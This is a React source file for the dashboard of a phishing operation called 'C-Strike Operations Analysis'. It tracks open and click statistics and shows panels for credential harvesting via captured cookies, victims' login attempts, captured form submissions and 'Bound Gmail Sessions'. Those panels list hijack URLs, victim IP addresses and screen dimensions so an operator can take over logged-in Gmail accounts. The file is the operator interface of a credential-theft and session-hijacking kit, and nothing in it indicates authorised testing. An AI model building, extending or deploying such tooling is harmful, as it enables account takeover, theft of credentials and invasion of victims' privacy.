import React, { useState, useEffect, useRef } from "react";
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement,
  PointElement,
  LineElement,
} from "chart.js";
import httpClient from "../services/httpClient";
import { fetchCampaigns } from "../services/apiService";
import CampaignStatistics from "../components/Charts/CampaignStatistics";
import LoginAttemptsList from "../components/LoginAttempts/LoginAttemptsList";
import FormDataList from "../components/FormSubmissions/FormDataList";
import CookiesListener from "../components/CookieListener";
import GmailBrowserControl from "../components/GmailBrowserControl";

// Register Chart.js components and plugins
ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  ArcElement,
  Tooltip,
  Legend,
  Title
);

// Subtle Matrix Background Component
const MatrixBackground = () => {
  useEffect(() => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.className = 'matrix-bg';
    document.body.appendChild(canvas);
    
    const resizeCanvas = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);
    
    const chars = '01';
    const fontSize = 14;
    const columns = Math.floor(canvas.width / fontSize);
    const drops = new Array(columns).fill(0);
    
    const draw = () => {
      ctx.fillStyle = 'rgba(10, 15, 20, 0.1)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      ctx.fillStyle = 'rgba(0, 212, 170, 0.1)';
      ctx.font = `${fontSize}px monospace`;
      
      for (let i = 0; i < drops.length; i++) {
        const char = chars[Math.floor(Math.random() * chars.length)];
        const x = i * fontSize;
        const y = drops[i] * fontSize;
        
        ctx.fillText(char, x, y);
        
        if (y > canvas.height && Math.random() > 0.99) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    };
    
    const interval = setInterval(draw, 100);
    
    return () => {
      clearInterval(interval);
      window.removeEventListener('resize', resizeCanvas);
      if (document.body.contains(canvas)) {
        document.body.removeChild(canvas);
      }
    };
  }, []);
  
  return null;
};

const Dashboard = () => {
  const [campaigns, setCampaigns] = useState([]);
  const [selectedCampaign, setSelectedCampaign] = useState(null);
  const [loading, setLoading] = useState(true);
  const [campaignStats, setCampaignStats] = useState(null);
  const [lastUpdated, setLastUpdated] = useState(new Date());
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [gmailSessions, setGmailSessions] = useState([]);
  const refreshTimerRef = useRef(null);
  const REFRESH_INTERVAL = 30000; // 30 seconds

  // Fetch all campaigns on component mount and set up auto-refresh
  useEffect(() => {
    loadCampaigns();
    
    // Set up auto-refresh timer
    if (autoRefresh) {
      refreshTimerRef.current = setInterval(() => {
        loadCampaigns();
        if (selectedCampaign) {
          fetchCampaignStats(selectedCampaign.id);
          checkGmailSessions();
        }
        setLastUpdated(new Date());
      }, REFRESH_INTERVAL);
    }
    
    // Clean up timer on component unmount
    return () => {
      if (refreshTimerRef.current) {
        clearInterval(refreshTimerRef.current);
      }
    };
  }, [autoRefresh]); // Re-run when autoRefresh changes

  // Separate useEffect to handle selectedCampaign changes
  useEffect(() => {
    if (selectedCampaign) {
      fetchCampaignStats(selectedCampaign.id);
      checkGmailSessions();
    }
  }, [selectedCampaign]);

  // Function to load campaigns
  const loadCampaigns = async () => {
    try {
      setLoading(true);
      const campaignsData = await fetchCampaigns();
      // Filter to only show In Progress campaigns
      const inProgressCampaigns = campaignsData.filter(
        (campaign) => campaign.status === "In Progress"
      );
      setCampaigns(inProgressCampaigns);
      
      // Select the first campaign by default if available and no campaign is selected yet
      if (inProgressCampaigns.length > 0 && !selectedCampaign) {
        setSelectedCampaign(inProgressCampaigns[0]);
      }
      
    } catch (error) {
      console.error("Error fetching campaigns:", error);
    } finally {
      setLoading(false);
    }
  };

  // Function to check for bound Gmail browser sessions
  const checkGmailSessions = async () => {
    if (!selectedCampaign) return;
    
    try {
      const response = await httpClient.get(`/gmail-browser/bound-sessions?campaignId=${selectedCampaign.id}`);
      setGmailSessions(response.data.sessions || []);
    } catch (error) {
      console.error("Error fetching bound Gmail sessions:", error);
      setGmailSessions([]);
    }
  };

  // Function to create a new Gmail browser session
  const createGmailSession = async () => {
    if (!selectedCampaign) return;
    
    try {
      // Get user's screen dimensions
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      
      console.log(`📐 Creating Gmail session with victim's screen dimensions: ${screenWidth}x${screenHeight}`);
      
      // Generate a simple session token (in production, this should be done server-side)
      const sessionToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
      const response = await httpClient.post('/gmail-browser/create-session', {
        sessionToken,
        campaignId: selectedCampaign.id,
        screenWidth,
        screenHeight
      });
      
      if (response.data.success) {
        // Refresh the sessions list
        checkGmailSessions();
        console.log('Gmail browser session created with custom dimensions:', response.data.session);
      }
    } catch (error) {
      console.error("Error creating Gmail session:", error);
    }
  };

  // Fetch statistics for the selected campaign
  const fetchCampaignStats = async (campaignId) => {
    try {
      const response = await httpClient.get(`/GetCampaignLogs/${campaignId}`);
      
      // Process campaign statistics 
      const statsData = response.data;
      
      // Use the stats object that we're now returning from the backend
      if (statsData.stats) {
        setCampaignStats({
          totalSent: statsData.stats.totalSent,
          totalOpened: statsData.stats.totalOpened,
          uniqueOpens: statsData.stats.uniqueOpens,
          totalClicks: statsData.stats.totalClicks,
          uniqueClicks: statsData.stats.uniqueClicks,
          sentEmails: statsData.sent,
          openedEmails: statsData.opened,
          clickData: statsData.clicks,
          campaign: statsData.campaign
        });
      } else {
        // Fallback to the old format for backward compatibility
        const totalSent = statsData.sent.length;
        const totalOpened = statsData.opened.length;
        
        // Count unique email opens
        const uniqueOpens = new Set(statsData.opened.map(item => item.email)).size;
        
        // Calculate link clicks - use empty array if clicks not available
        const clickData = statsData.clicks || [];
        const totalClicks = clickData.length;
        const uniqueClicks = new Set(clickData.map(item => item.ip)).size;

        setCampaignStats({
          totalSent,
          totalOpened,
          uniqueOpens,
          totalClicks,
          uniqueClicks,
          sentEmails: statsData.sent,
          openedEmails: statsData.opened,
          clickData,
          campaign: statsData.campaign,
        });
      }

    } catch (error) {
      console.error("Error fetching campaign statistics:", error);
      setCampaignStats(null);
    }
  };

  // Handle campaign selection change
  const handleCampaignChange = async (e) => {
    const campaignId = e.target.value;
    if (campaignId === "") {
      setSelectedCampaign(null);
      setCampaignStats(null);
      return;
    }
    
    const campaign = campaigns.find(c => c.id.toString() === campaignId);
    setSelectedCampaign(campaign);
    await fetchCampaignStats(campaignId);
  };

  // Toggle auto-refresh
  const toggleAutoRefresh = () => {
    const newState = !autoRefresh;
    setAutoRefresh(newState);
    
    // Clear existing interval if turning off
    if (!newState && refreshTimerRef.current) {
      clearInterval(refreshTimerRef.current);
      refreshTimerRef.current = null;
    }
  };

  // Format the last updated time
  const formatLastUpdated = () => {
    return lastUpdated.toLocaleTimeString();
  };

  return (
    <div className="min-h-screen">
      <MatrixBackground />
      
      <div className="relative z-10 p-8">
        {/* Professional Header */}
        <div className="mb-8">
          <div className="flex justify-between items-start mb-8">
            {/* Title Section */}
            <div className="space-y-2">
              <div className="flex items-center space-x-4">
                <h1 className="text-4xl font-bold text-cyber-primary tracking-tight">
                  C-Strike Operations Analysis
                </h1>
              </div>
              <p className="text-cyber-muted">
                Advanced Phishing Campaign Management • Real-time Analytics
              </p>
            </div>
            
            {/* Control Panel */}
            <div className="flex items-center space-x-4">
              
              {/* Auto-refresh Toggle */}
              <div className="glass-card px-4 py-3">
                <div className="flex items-center space-x-3">
                  <span className="text-sm text-cyber-muted">Auto-scan</span>
                  <div 
                    className={`toggle-switch ${autoRefresh ? 'active' : ''}`}
                    onClick={toggleAutoRefresh}
                  >
                    <div className="toggle-slider"></div>
                  </div>
                  <button
                    onClick={() => {
                      loadCampaigns();
                      if (selectedCampaign) {
                        fetchCampaignStats(selectedCampaign.id);
                        checkGmailSessions();
                      }
                      setLastUpdated(new Date());
                    }}
                    className="glass-button p-2 rounded-lg"
                    title="Manual Refresh"
                  >
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                    </svg>
                  </button>
                </div>
                <div className="text-xs text-cyber-muted mt-1">
                  Last updated: {formatLastUpdated()}
                </div>
              </div>
              
              {/* Campaign Selector */}
              <div className="glass-card px-4 py-3 min-w-80">
                <label className="block text-sm text-cyber-muted mb-2">
                  Target Campaign
                </label>
                <select
                  className="glass-select w-full px-3 py-2 rounded-lg text-sm"
                  onChange={handleCampaignChange}
                  value={selectedCampaign?.id || ""}
                  disabled={loading}
                >
                  <option value="">Select Campaign</option>
                  {campaigns.map((campaign) => (
                    <option key={campaign.id} value={campaign.id}>
                      {campaign.name}
                    </option>
                  ))}
                </select>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="space-y-8">
          {selectedCampaign ? (
            <>
              {campaignStats ? (
                <>
                  {/* Campaign Analytics */}
                  <div className="glass-card p-8">
                    <div className="flex items-center justify-between mb-6">
                      <div>
                        <h2 className="text-2xl font-semibold text-cyber-primary mb-2">
                          {selectedCampaign.name}
                        </h2>
                        <p className="text-cyber-muted">Campaign Analytics & Metrics</p>
                      </div>
                      <div className="badge badge-success">
                        Active
                      </div>
                    </div>
                    <div className="chart-container">
                      <CampaignStatistics stats={campaignStats} />
                    </div>
                  </div>

                  {/* Credential Harvesting */}
                  <div className="glass-card p-8">
                    <div className="flex items-center space-x-3 mb-6">
                      <svg className="w-6 h-6 text-cyber-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                      </svg>
                      <h3 className="text-xl font-semibold text-cyber-primary">
                        Credential Harvesting
                      </h3>
                    </div>
                    <CookiesListener campaignId={selectedCampaign.id} />
                  </div>
                  
                  {/* Security Events */}
                  <div className="glass-card p-8">
                    <div className="flex items-center space-x-3 mb-6">
                      <svg className="w-6 h-6 text-cyber-accent" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                      <h3 className="text-xl font-semibold text-cyber-primary">
                        Authentication Events
                      </h3>
                    </div>
                    <LoginAttemptsList campaignId={selectedCampaign.id} />
                  </div>

                  {/* Form Submissions */}
                  <div className="glass-card p-8">
                    <div className="flex items-center space-x-3 mb-6">
                      <svg className="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                      </svg>
                      <h3 className="text-xl font-semibold text-cyber-primary">
                        Form Submissions
                      </h3>
                    </div>
                    <FormDataList campaignId={selectedCampaign.id} />
                  </div>

                  {/* Gmail Browser Sessions */}
                  <div className="glass-card p-8">
                    <div className="flex items-center justify-between mb-6">
                      <div className="flex items-center space-x-3">
                        <svg className="w-6 h-6 text-cyber-secondary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.19 8.688a4.5 4.5 0 011.242 7.244l-4.5 4.5a4.5 4.5 0 01-6.364-6.364l1.757-1.757m13.35-.622l1.757-1.757a4.5 4.5 0 00-6.364-6.364l-4.5 4.5a4.5 4.5 0 001.242 7.244" />
                        </svg>
                        <h3 className="text-xl font-semibold text-cyber-primary">
                          Bound Gmail Sessions
                        </h3>
                        {gmailSessions.length > 0 && (
                          <div className="badge badge-success">
                            {gmailSessions.length} Bound
                          </div>
                        )}
                      </div>
                      
                      <button
                        onClick={createGmailSession}
                        className="glass-button px-4 py-2 rounded-lg flex items-center space-x-2 bg-cyber-secondary/20 hover:bg-cyber-secondary/30"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                        </svg>
                        <span>Create Session</span>
                      </button>
                    </div>
                    
                    {gmailSessions.length > 0 ? (
                      <div className="space-y-4">
                        {gmailSessions.map((session) => (
                          <div key={session.session_token} className="bg-cyber-dark/30 rounded-lg p-4 border border-cyber-primary/20">
                            <div className="flex items-center justify-between mb-3">
                              <div className="flex items-center space-x-3">
                                <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                                <span className="text-cyber-primary font-medium">
                                  Session {session.session_token.substring(0, 8)}...
                                </span>
                                <div className="badge badge-outline badge-success">
                                  Logged In
                                </div>
                              </div>
                              <div className="text-xs text-cyber-muted">
                                {new Date(session.logged_in_at).toLocaleString()}
                              </div>
                            </div>
                            
                            <div className="mb-3">
                              <label className="text-sm text-cyber-muted mb-1 block">Bind URL:</label>
                              <div className="flex items-center space-x-2">
                                <input 
                                  type="text" 
                                  value={session.bind_url} 
                                  readOnly 
                                  className="flex-1 bg-cyber-dark/50 border border-cyber-primary/30 rounded px-3 py-2 text-sm text-cyber-primary font-mono"
                                />
                                <button
                                  onClick={() => navigator.clipboard.writeText(session.bind_url)}
                                  className="glass-button px-3 py-2 rounded text-xs bg-cyber-accent/20 hover:bg-cyber-accent/30"
                                  title="Copy URL"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                  </svg>
                                </button>
                                <button
                                  onClick={() => window.open(session.bind_url, '_blank')}
                                  className="glass-button px-3 py-2 rounded text-xs bg-cyber-secondary/20 hover:bg-cyber-secondary/30"
                                  title="Open Session"
                                >
                                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-2M14 4h6m0 0v6m0-6L10 14" />
                                  </svg>
                                </button>
                              </div>
                            </div>
                            
                            {session.user_info && session.user_info.ip && (
                              <div className="text-xs text-cyber-muted">
                                <span>Victim IP: {session.user_info.ip}</span>
                                {session.user_info.screenWidth && session.user_info.screenHeight && (
                                  <span className="ml-4">
                                    Screen: {session.user_info.screenWidth}x{session.user_info.screenHeight}
                                  </span>
                                )}
                              </div>
                            )}
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="text-center py-8">
                        <svg className="w-16 h-16 text-cyber-muted mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.19 8.688a4.5 4.5 0 011.242 7.244l-4.5 4.5a4.5 4.5 0 01-6.364-6.364l1.757-1.757m13.35-.622l1.757-1.757a4.5 4.5 0 00-6.364-6.364l-4.5 4.5a4.5 4.5 0 001.242 7.244" />
                        </svg>
                        <h4 className="text-lg font-semibold text-cyber-primary mb-2">
                          No Bound Sessions
                        </h4>
                        <p className="text-cyber-muted mb-4">
                          Create a Gmail session and wait for victims to log in to generate bind URLs
                        </p>
                        <button
                          onClick={createGmailSession}
                          className="glass-button px-6 py-3 rounded-lg bg-cyber-secondary/20 hover:bg-cyber-secondary/30"
                        >
                          Create Gmail Session
                        </button>
                      </div>
                    )}
                  </div>
                </>
              ) : (
                <div className="glass-card p-16 text-center">
                  <div className="loading-spinner mx-auto mb-6"></div>
                  <h3 className="text-xl text-cyber-primary mb-2">
                    Analyzing Campaign Data
                  </h3>
                  <p className="text-cyber-muted">
                    Processing campaign metrics and security events...
                  </p>
                </div>
              )}
            </>
          ) : (
            <div className="glass-card p-16 text-center">
              {loading ? (
                <>
                  <div className="loading-spinner mx-auto mb-6"></div>
                  <h3 className="text-xl text-cyber-primary mb-2">
                    Scanning Active Campaigns
                  </h3>
                  <p className="text-cyber-muted">
                    Initializing security framework...
                  </p>
                </>
              ) : campaigns.length === 0 ? (
                <>
                  <svg className="w-16 h-16 text-cyber-accent mx-auto mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
                  </svg>
                  <h3 className="text-xl text-cyber-accent mb-2">
                    No Active Operations
                  </h3>
                  <p className="text-cyber-muted">
                    Deploy a phishing campaign to begin monitoring security events
                  </p>
                </>
              ) : (
                <>
                  <svg className="w-16 h-16 text-cyber-secondary mx-auto mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
                  </svg>
                  <h3 className="text-xl text-cyber-primary mb-2">
                    Select Target Campaign
                  </h3>
                  <p className="text-cyber-muted">
                    Choose a campaign from the dropdown to view detailed analytics
                  </p>
                </>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
